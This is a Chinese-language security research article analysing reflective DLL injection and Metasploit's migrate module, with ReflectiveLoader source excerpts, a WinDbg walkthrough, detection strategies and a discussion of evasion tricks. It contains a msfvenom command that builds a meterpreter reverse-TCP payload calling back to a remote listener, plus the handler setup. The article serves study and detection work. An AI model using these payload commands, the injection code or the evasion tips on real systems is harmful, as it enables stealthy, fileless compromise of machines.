> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [paper.seebug.org](https://paper.seebug.org/1855/)

> 作者：深信服千里目安全实验室 原文链接：https://mp.weixin.qq.com/s/kVpesy_w7XLanL_WhRhn-Q

**作者：深信服千里目安全实验室**  
**原文链接：[https://mp.weixin.qq.com/s/kVpesy_w7XLanL_WhRhn-Q](https://mp.weixin.qq.com/s/kVpesy_w7XLanL_WhRhn-Q)**

dll 注入技术是让某个进程主动加载指定的 dll 的技术。恶意软件为了提高隐蔽性，通常会使用 dll 注入技术将自身的恶意代码以 dll 的形式注入高可信进程。

常规的 dll 注入技术使用 LoadLibraryA() 函数来使被注入进程加载指定的 dll。常规 dll 注入的方式一个致命的缺陷是需要恶意的 dll 以文件的形式存储在受害者主机上。这样使得常规 dll 注入技术在受害者主机上留下痕迹较大，很容易被 edr 等安全产品检测到。为了弥补这个缺陷，stephen fewer 提出了反射式 dll 注入技术并在 [github 开源](https://github.com/stephenfewer/ReflectiveDLLInjection)，反射式 dll 注入技术的优势在于可以使得恶意的 dll 通过 socket 等方式直接传输到目标进程内存并加载，期间无任何文件落地，安全产品的检测难度大大增加。

本文将从 dll 注入技术简介、msf migrate 模块剖析、检测思路和攻防对抗的思考等方向展开说明反射式 dll 注入技术。

2.1 常规 dll 注入技术
---------------

常规 dll 注入有:

1.  通过调用 CreateRemoteThread()/NtCreateThread()/RtlCreateUserThread() 函数在被注入进程创建线程进行 dll 注入。
2.  通过调用 QueueUserAPC()/SetThreadContext() 函数来劫持被注入进程已存在的线程加载 dll。
3.  通过调用 SetWindowsHookEx() 函数来设置拦截事件，在发生对应的事件时，被注入进程执行拦截事件函数加载 dll。

以使用 CreateRemoteThread() 函数进行 dll 注入的方式为例，实现思路如下:

1.  获取被注入进程 PID。
2.  在注入进程的访问令牌中开启 SE_DEBUG_NAME 权限。
3.  使用 openOpenProcess() 函数获取被注入进程句柄。
4.  使用 VirtualAllocEx() 函数在被注入进程内开辟缓冲区并使用 WriteProcessMemory() 函数写入 DLL 路径的字符串。
5.  使用 GetProcAddress() 函数在当前进程加载的 kernel32.dll 找到 LoadLibraryA 函数的地址。
6.  通过 CreateRemoteThread() 函数来调用 LoadLibraryA() 函数，在被注入进程新启动一个线程，使得被注入进程进程加载恶意的 DLL。

![](https://images.seebug.org/content/images/2022/03/a2c1fac8-a5fc-41ec-bee0-8864d3c839ce.png-w331s)

常规 dll 注入示意图如上图所示。该图直接从步骤 3) 开始，步骤 1) 和步骤 2) 不在赘述。

2.2 反射式 dll 注入技术
----------------

反射式 dll 注入与常规 dll 注入类似，而不同的地方在于反射式 dll 注入技术自己实现了一个 reflective loader() 函数来代替 LoadLibaryA() 函数去加载 dll，示意图如下图所示。蓝色的线表示与用常规 dll 注入相同的步骤，红框中的是 reflective loader() 函数行为，也是下面重点描述的地方。

Reflective loader 实现思路如下：

1.  获得被注入进程未解析的 dll 的基地址，即下图第 7 步所指的 dll。
    
2.  获得必要的 dll 句柄和函数为修复导入表做准备。
    
3.  分配一块新内存去取解析 dll，并把 pe 头复制到新内存中和将各节复制到新内存中。
4.  修复导入表和重定向表。
    
5.  执行 DllMain() 函数。
    

![](https://images.seebug.org/content/images/2022/03/fcf5150e-c67c-46ab-87fc-ee58b3581db0.png-w331s)

msf 的 migrate 模块是 post 阶段的一个模块，其作用是将 meterpreter payload 从当前进程迁移到指定进程。

在获得 meterpreter session 后可以直接使用 migrate 命令迁移进程，其效果如下图所示:

![](https://images.seebug.org/content/images/2022/03/23/1648020752000-msf_migrate_show.png-w331s)

migrate 的模块的实现和 stephen fewer 的 [ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection) 项目大致相同，增加了一些细节，其实现原理如下:

1.  读取 metsrv.dll（metpreter payload 模板 dll）文件到内存中。
    
2.  生成最终的 payload。  
    a) msf 生成一小段汇编 migrate stub 主要用于建立 socket 连接。  
    b) 将 metsrv.dll 的 dos 头修改为一小段汇编 meterpreter_loader 主要用于调用 reflective loader 函数和 dllmain 函数。在 metsrv.dll 的 config block 区填充 meterpreter 建立 session 时的配置信息。  
    c) 最后将 migrate stub 和修改后的 metsrv.dll 拼接在一起生成最终的 payload。
    
3.  向 msf server 发送 migrate 请求和 payload。
    
4.  msf 向迁移目标进程分配一块内存并写入 payload。
    
5.  msf 首先会创建的远程线程执行 migrate stub，如果失败了，就会尝试用 apc 注入的方式执行 migrate stub。migrate stub 会调用 meterpreter loader，meterpreter loader 才会调用 reflective loader。
    
6.  reflective loader 进行反射式 dll 注入。
    
7.  最后 msf client 和 msf server 建立一个新的 session。
    

原理图如下所示:

![](https://images.seebug.org/content/images/2022/03/23/1648020752000-msf_migrate.png-w331s)

图中红色的线表示与常规反射式 dll 注入不同的地方。红色的填充表示修改内容，绿色的填充表示增加内容。migrate 模块的 reflective loader 是直接复用了 stephen fewer 的 ReflectiveDLLInjection 项目的 [ReflectiveLoader.c](https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/dll/src/ReflectiveLoader.c) 中的 ReflectiveLoader() 函数。下面我们主要关注 reflective loader 的行为。

3.1 静态分析
--------

### 3.1.1 获取 dll 基地址

ReflectiveLoader() 首先会调用 caller() 函数

```
uiLibraryAddress = caller();

```

caller() 函数实质上是_ReturnAddress() 函数的封装。caller() 函数的作用是获取 caller() 函数的返回值，在这里也就是 ReflectiveLoader() 函数中调用 caller() 函数的下一条指令的地址。

```
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)WIN_GET_CALLER(); }

```

然后，向低地址逐字节比较是否为为 dos 头的标识 MZ 字串，若当前地址的内容为 MZ 字串，则把当前地址认为是 dos 头结构体的开头，并校验 dos 头 e_lfanew 结构成员是否指向 pe 头的标识”PE” 字串。若校验通过，则认为当前地址是正确的 dos 头结构体的开头。

```
while( TRUE )
{
       if( ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_magic == IMAGE_DOS_SIGNATURE ) 
    {
        uiHeaderValue = ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
        if( uiHeaderValue >= sizeof(IMAGE_DOS_HEADER) && uiHeaderValue < 1024 )
        {
            uiHeaderValue += uiLibraryAddress;
                       if( ((PIMAGE_NT_HEADERS)uiHeaderValue)->Signature == IMAGE_NT_SIGNATURE )
                break;
        }
    }
    uiLibraryAddress--;
}

```

### 3.1.2 获取必要的 dll 句柄和函数地址

获取必要的 dll 句柄是通过遍历 peb 结构体中的 ldr 成员中的 InMemoryOrderModuleList 链表获取 dll 名称，之后算出 dll 名称的 hash，最后进行 hash 对比得到最终的 hash。

```
uiBaseAddress = (ULONG_PTR)((_PPEB)uiBaseAddress)->pLdr;
uiValueA = (ULONG_PTR)((PPEB_LDR_DATA)uiBaseAddress)->InMemoryOrderModuleList.Flink;
while( uiValueA )
{
    uiValueB = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.pBuffer;
    usCounter = ((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.Length;
    uiValueC = 0;
    ULONG_PTR tmpValC = uiValueC;
       ....
    if( (DWORD)uiValueC == KERNEL32DLL_HASH )

```

必要的函数是遍历函数所在的 dll 导出表获得函数名称，然后做 hash 对比得到的。

```
uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;
uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;
uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];
uiExportDir = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );
uiNameArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames );
uiNameOrdinals = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals );
usCounter = 3;
while( usCounter > 0 )
        {
        dwHashValue = _hash( (char *)( uiBaseAddress + DEREF_32( uiNameArray ) )  );
            if( dwHashValue == LOADLIBRARYA_HASH
                       || ...
            )
            {
                uiAddressArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );
                uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );
                if( dwHashValue == LOADLIBRARYA_HASH )
                    pLoadLibraryA = (LOADLIBRARYA)( uiBaseAddress + DEREF_32( uiAddressArray ) );
                               ...
                usCounter--;
            }
            uiNameArray += sizeof(DWORD);
            uiNameOrdinals += sizeof(WORD);
        }
}

```

### 3.1.3 将 dll 映射到新内存

Nt optional header 结构体中的 SizeOfImage 变量存储着 pe 文件在内存中解析后所占的内存大小。所以 ReflectiveLoader() 获取到 SizeOfImage 的大小，分配一块新内存, 然后按照 section headers 结构中的文件相对偏移和相对虚拟地址，将 pe 节一一映射到新内存中。

```
uiBaseAddress = (ULONG_PTR)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
...
uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
uiValueB = uiLibraryAddress;
uiValueC = uiBaseAddress;while( uiValueA-- )
    *(BYTE *)uiValueC++ = *(BYTE *)uiValueB++;uiValueA = ( (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader );
uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
while( uiValueE-- )
{
    uiValueB = ( uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress );
    uiValueC = ( uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData );
    uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;
       while( uiValueD-- )
        *(BYTE *)uiValueB++ = *(BYTE *)uiValueC++;
    uiValueA += sizeof( IMAGE_SECTION_HEADER );
}

```

### 3.1.4 修复导入表和重定位表

首先更具导入表结构，找到导入函数所在的 dll 名称，然后使用 loadlibary() 函数载入 dll，根据函数序号或者函数名称，在载入的 dll 的导出表中，通过 hash 对比，并把找出的函数地址写入到新内存的 IAT 表中。

```
uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];
uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );while( ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Characteristics )
{
       uiLibraryAddress = (ULONG_PTR)pLoadLibraryA( (LPCSTR)( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name ) );
    ...
    uiValueD = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk );
       uiValueA = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk );
    while( DEREF(uiValueA) )
    {
               if( uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
        {              uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
            uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];
            uiExportDir = ( uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );
            uiAddressArray = ( uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );
            uiAddressArray += ( ( IMAGE_ORDINAL( ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal ) - ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->Base ) * sizeof(DWORD) );
                       DEREF(uiValueA) = ( uiLibraryAddress + DEREF_32(uiAddressArray) );
        }
        else
        {
                       uiValueB = ( uiBaseAddress + DEREF(uiValueA) );
            DEREF(uiValueA) = (ULONG_PTR)pGetProcAddress( (HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name );
        }
        uiValueA += sizeof( ULONG_PTR );
        if( uiValueD )
            uiValueD += sizeof( ULONG_PTR );
    }
    uiValueC += sizeof( IMAGE_IMPORT_DESCRIPTOR );
}

```

重定位表是为了解决程序指定的 imagebase 被占用的情况下，程序使用绝对地址导致访问错误的情况。一般来说，在引用全局变量的时候会用到绝对地址。这时候就需要去修正对应内存的汇编指令。

```
uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;
uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];if( ((PIMAGE_DATA_DIRECTORY)uiValueB)->Size )
{
    uiValueE = ((PIMAGE_BASE_RELOCATION)uiValueB)->SizeOfBlock;
    uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );
    while( uiValueE && ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock )
    {
        uiValueA = ( uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress );
        uiValueB = ( ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) / sizeof( IMAGE_RELOC );
        uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);
               while( uiValueB-- )
        {
            if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64 )
                *(ULONG_PTR *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
            else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW )
                *(DWORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;
            else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH )
                *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
            else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW )
                *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);
            uiValueD += sizeof( IMAGE_RELOC );
        }
        uiValueE -= ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
        uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
    }
}

```

3.2 动态调试
--------

本节一方面是演示如何实际的动态调试 msf 的 migrate 模块，另一方面也是 3.1.1 的一个补充，从汇编层次来看 3.1.1 节会更容易理解。

首先用 msfvenom 生成 payload

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.75.132 lport=4444 -f exe -o msf.exe

```

并使用 msfconsole 设置监听

```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcppayload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 0.0.0.0:4444 

```

之后在受害机使用 windbg 启动 msf.exe 并且

```
bu KERNEL32!CreateRemoteThread;g

```

获得被注入进程新线程执行的地址，以便调试被注入进程。

当建立 session 连接后，在 msfconsole 使用 migrate 命令

```
 migrate 5600 //5600是要迁移的进程的pid

```

然后 msf.exe 在 CreateRemoteThread 函数断下，CreateRemoteThread 函数原型如下

```
HANDLE CreateRemoteThread(
  [in]  HANDLE                 hProcess,
  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  [in]  SIZE_T                 dwStackSize,
  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
  [in]  LPVOID                 lpParameter,
  [in]  DWORD                  dwCreationFlags,
  [out] LPDWORD                lpThreadId
);

```

所以我们要找第四个参数 lpStartAddress 的值，即 r9 寄存器的内容，

![](https://images.seebug.org/content/images/2022/03/23/1648020752000-msf_createremotethread.png-w331s)

使用

```
!address 000001c160bb0000

```

去 notepad 进程验证一下，是可读可写的内存，基本上就是对的

![](https://images.seebug.org/content/images/2022/03/23/1648020752000-notepad_rwx.png-w331s)

此时的地址是 migrate stub 汇编代码的地址，我们期望直接断在 reflective loader 的函数地址，我们通过

```
s -a 000001c1`60bb0000 L32000 MZ //000001c1`60bb0000为上面的lpStartAddress，3200为我们获取到的内存块大小

```

直接去搜 MZ 字串定位到 meterpreter loader 汇编的地址，进而定位到 reflective loader 的函数地址

![](https://images.seebug.org/content/images/2022/03/23/1648020753000-meterpreter_loader.png-w331s)

meterpreter loader 将 reflective loader 函数的地址放到 rbx 中，所以我们可直接断在此处，进入 reflective loader 的函数，如下图所示

![](https://images.seebug.org/content/images/2022/03/23/1648020753000-call_reflective_loader.png-w331s)

reflective loader 首先 call 000001c1`60bb5dc9 也就是 caller() 函数，caller() 函数的实现就比较简单了，一共两条汇编指令，起作用就是返回下一条指令的地址

![](https://images.seebug.org/content/images/2022/03/23/1648020753000-get_dll_base.png-w331s)

在这里也就是 0x000001c160bb5e08

![](https://images.seebug.org/content/images/2022/03/23/1648020753000-notepad_return_address.png-w331s)

获得下一条指令后的地址后，就会比较获取的地址的内容是否为 MZ 如果不是的话就会把获取的地址减一作为新地址比较，如果是的话，则会比较 e_lfanew 结构成员是否指向 PE，若是则此时的地址作为 dll 的基地址。后面调试过程不在赘述。

反射式 dll 注入技术有很多种检测方法，如内存扫描、IOA 等。下面是以内存扫描为例，我想到的一些扫描策略和比较好的检测点。

扫描策略:

1.  Hook 敏感 api，当发生敏感 api 调用序列时，对注入进程和被注入进程扫描内存。
    
2.  跳过 InMemoryOrderModuleList 中的 dll。
    

检测点多是跟 reflective loader 函数的行为有关，检测点如下：

1.  强特征匹配_ReturnAddress() 的函数。Reflectiveloader 函数定位 dos 头的前置操作就是调用调用_ReturnAddress() 函数获得当前 dll 的一个地址。
    
2.  扫描定位 pe 开头位置的代码逻辑。详见 3.1 节，我们可以弱匹配此逻辑。
    
3.  扫描特定的 hash 函数和 hash 值。在 dll 注入过程中，需要许多 dll 句柄和函数地址，所以不得不使用 hash 对比 dll 名称和函数名称。我们可以匹配 hash 函数和这些特殊的 hash 值。
    
4.  从整体上检测 dll 注入。在被注入进程其实是存在两份 dll 文件，一份是解析前的原 pe 文件，一份是解析后的 pe 文件。我们可以检测这两份 dll 文件的关系来确定是反射式 dll 注入工具。
    

深信服云主机安全保护平台 CWPP 能够有效检测此类利用反射式 DLL 注入 payload 的无文件攻击技术。检测结果如图所示:

![](https://images.seebug.org/content/images/2022/03/846785f2-c0db-43a6-86c6-3fad71eadace.png-w331s)

对于标准的反射 dll 注入是有很多种检测方式的，主要是作者没有刻意的做免杀，下面对于我搜集到了一些免杀方式，探讨一下其检测策略。

1.  避免直接调用敏感 api 。例如不直接调用 writeprocessmemory 等函数，而是直接用 syscall 调用。这种免杀方式只能绕过用户态的 hook。对于内核态 hook 可以解这个问题。
2.  dll 在内存中的 rwx 权限进行了去除，变成 rx。其实有好多粗暴的检测反射式 dll 注入的攻击方式，就是检测 rwx 权限的内存是否为 pe 文件。
3.  擦除 nt 头和 dos 头。这种免杀方式会直接让检测点 4) 影响较大，不能简单的校验 pe 头了，需要加入更精确的确定两个 dll 的文件，比如说，首先通过读取未解析的 dll 的 SizeOfImage 的大小，然后去找此大小的内存块，然后对比代码段是否一致，去判断是否为同一 pe 文件。
    
4.  抹除未解析 pe 文件的内存。这种免杀方式会导致检测点 4) 彻底失效，这种情况下我们只能对 reflectiveloader() 函数进行检测。
    
5.  抹除 reflectiveloader() 函数的内存。这里就比较难检测了。但是也是有检测点的，这里关键是如何确定这块内存是 pe 结构，重建 pe 结构之后，我们可以通过导出表去看导出函数是否被抹除。

1.  [https://bbs.pediy.com/thread-220405.htm](https://bbs.pediy.com/thread-220405.htm)
    
2.  [https://bbs.pediy.com/thread-224078.htm](https://bbs.pediy.com/thread-224078.htm)
    
3.  [https://github.com/sud01oo/ProcessInjection](https://github.com/sud01oo/ProcessInjection)
    
4.  [https://github.com/stephenfewer/ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection)
    
5.  《Windows PE 权威指南》
    
6.  [https://github.com/rapid7/metasploit-payloads](https://github.com/rapid7/metasploit-payloads)
    

![](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg) 本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：[https://paper.seebug.org/1855/](https://paper.seebug.org/1855/)